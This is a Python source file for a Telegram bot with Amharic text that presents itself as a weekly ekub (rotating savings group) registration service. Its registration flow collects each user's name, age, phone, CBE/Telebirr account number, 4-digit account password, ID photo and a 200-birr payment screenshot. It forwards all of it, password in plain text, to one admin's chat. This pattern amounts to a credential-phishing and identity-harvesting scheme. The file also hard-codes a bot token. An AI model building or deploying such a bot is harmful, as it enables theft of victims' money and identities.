import os
import sqlite3
import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread

# --- 1. Render Health Check ---
class HealthCheck(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Ekub Bot is active")

def run_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthCheck)
    server.serve_forever()

# --- 2. Configuration & Database ---
TOKEN = "8717535794:AAEpOdDqigZz4noSRUidn8y8gdLBH0t4fOo"
ADMIN_ID = 7868124597
MAX_USERS = 30 # ተጠቃሚዎች ወደ 30 አድገዋል

def init_db():
    conn = sqlite3.connect('ekub_pro_v4.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY)''')
    conn.commit()
    conn.close()

init_db()

# Conversation States
F_NAME, L_NAME, AGE, COUNTRY, PHONE, ACC_INFO, PASS, E_TYPE, ID_PHOTO, SCREENSHOT = range(10)

# --- 3. Scheduled Job (Sunday 8:00 PM) ---
async def sunday_reminder(context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect('ekub_pro_v4.db')
    c = conn.cursor()
    c.execute("SELECT user_id FROM subscribers")
    users = c.fetchall()
    conn.close()
    
    msg = "እቁቡ ሊጀመር 30ደቂቃ ቀርቷል።"
    for user in users:
        try:
            await context.bot.send_message(chat_id=user[0], text=msg)
        except: continue

# --- 4. Bot Functions ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    conn = sqlite3.connect('ekub_pro_v4.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO subscribers (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

    welcome_text = "እንኳን ወደ አዳነ ሳምንታዊ የብር እቁብ በደህና መጡ"
    keyboard = [
        [InlineKeyboardButton("ለመመዝገብ", callback_data="register_start")],
        [InlineKeyboardButton("መረጃ ለማግኘት", callback_data="info")],
        [InlineKeyboardButton("የእኔ መታወቂያ", callback_data="send_id")]
    ]
    if user_id == ADMIN_ID:
        keyboard.append([InlineKeyboardButton("እቁብ ጀምር (Admin)", callback_data="admin_start_ekub")])

    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))

async def start_reg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    await update.callback_query.message.reply_text("መጠሪያ ስምዎን ይላኩ፦")
    return F_NAME

# ... (ሌሎች የምዝገባ ደረጃዎች እንደ ቀደመው ይቀጥላሉ) ...
# ስም፣ እድሜ፣ ሀገር፣ ስልክ፣ አካውንት፣ ፓስወርድ፣ እቁብ አይነት፣ መታወቂያ ፎቶ...

async def admin_actions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "admin_start_ekub":
        conn = sqlite3.connect('ekub_pro_v4.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM subscribers")
        users = c.fetchall()
        conn.close()
        
        msg = "እቁቡ በይፋ ተጀምሯል የእቁቡን ገንዘብ ገቢ በማድረግ ይጀምሩ ገቢ ማድረጊያ የሚያልቅበት ቀን እሁድ - 7 ሰዓት"
        for user in users:
            try:
                await context.bot.send_message(chat_id=user[0], text=msg)
            except: continue
        await query.message.reply_text("መልዕክቱ ለሁሉም ተጠቃሚዎች ተልኳል።")

# --- 5. Registration Steps (አጠር ያሉ) ---
async def get_fname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] = f"ስም: {update.message.text}\n"
    await update.message.reply_text("የአባት ስም?")
    return L_NAME

async def get_lname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] += f"አባት: {update.message.text}\n"
    await update.message.reply_text("እድሜ?")
    return AGE

async def get_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] += f"እድሜ: {update.message.text}\n"
    await update.message.reply_text("ከተማ/ሀገር?")
    return COUNTRY

async def get_country(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] += f"ሀገር: {update.message.text}\n"
    await update.message.reply_text("ስልክ ቁጥር?")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] += f"ስልክ: {update.message.text}\n"
    await update.message.reply_text("CBE/Telebirr አካውንት?")
    return ACC_INFO

async def get_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] += f"አካውንት: {update.message.text}\n"
    await update.message.reply_text("ባለ 4 አሃዝ Password?")
    return PASS

async def get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['info'] += f"Password: {update.message.text}\n"
    kb = [[InlineKeyboardButton("ሙሉ እጣ", callback_data="full"), InlineKeyboardButton("ግማሽ እጣ", callback_data="half")]]
    await update.message.reply_text("እቁብ አይነት?", reply_markup=InlineKeyboardMarkup(kb))
    return E_TYPE

async def get_etype(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer()
    context.user_data['info'] += f"አይነት: {update.callback_query.data}\n"
    await update.callback_query.message.reply_text("የመታወቂያ ፎቶ (ID) ይላኩ፦")
    return ID_PHOTO

async def get_id_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['id_img'] = update.message.photo[-1].file_id
    await update.message.reply_text("አሁን የ200 ብር ክፍያ ደረሰኝ (Screenshot) ይላኩ፦")
    return SCREENSHOT

async def get_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    info = context.user_data['info']
    id_img = context.user_data['id_img']
    
    # ለአድሚን መላክ
    verify_kb = [[InlineKeyboardButton("አረጋግጥ", callback_data=f"verify_{user_id}")]]
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=id_img, caption="🆔 መታወቂያ")
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=update.message.photo[-1].file_id, caption=f"🔔 አዲስ ምዝገባ\n\n{info}", reply_markup=InlineKeyboardMarkup(verify_kb))
    
    await update.message.reply_text("መዝጋቢው አስከሚያረጋግጥ ይጠብቁ።")
    return ConversationHandler.END

# --- 6. Verify Callback ---
async def verify_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    tid = int(query.data.split("_")[1])
    await query.answer()
    await context.bot.send_message(chat_id=tid, text="✅ ምዝገባዎ ተረጋግጧል!")
    await query.edit_message_caption(caption="🟢 ተረጋግጧል")

# --- 7. Main Execution ---
if __name__ == '__main__':
    Thread(target=run_server, daemon=True).start()
    app = Application.builder().token(TOKEN).build()

    # እሁድ 8:00 PM ማሳሰቢያ ለመላክ (Job Queue)
    job_queue = app.job_queue
    # በየሳምንቱ እሁድ (Day 6) በ 20:00 (8 PM) ሰዓት
    job_queue.run_daily(sunday_reminder, time=datetime.time(hour=20, minute=0, second=0))

    reg_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_reg, pattern="register_start")],
        states={
            F_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_fname)],
            L_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_lname)],
            AGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_age)],
            COUNTRY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_country)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            ACC_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_acc)],
            PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_pass)],
            E_TYPE: [CallbackQueryHandler(get_etype, pattern="^(full|half)$")],
            ID_PHOTO: [MessageHandler(filters.PHOTO, get_id_photo)],
            SCREENSHOT: [MessageHandler(filters.PHOTO, get_screenshot)],
        },
        fallbacks=[CommandHandler("start", start)]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(reg_handler)
    app.add_handler(CallbackQueryHandler(admin_actions, pattern="admin_start_ekub"))
    app.add_handler(CallbackQueryHandler(verify_user, pattern="^verify_"))
    
    print("Bot is Running with 30 Users & Sunday Scheduler...")
    app.run_polling()
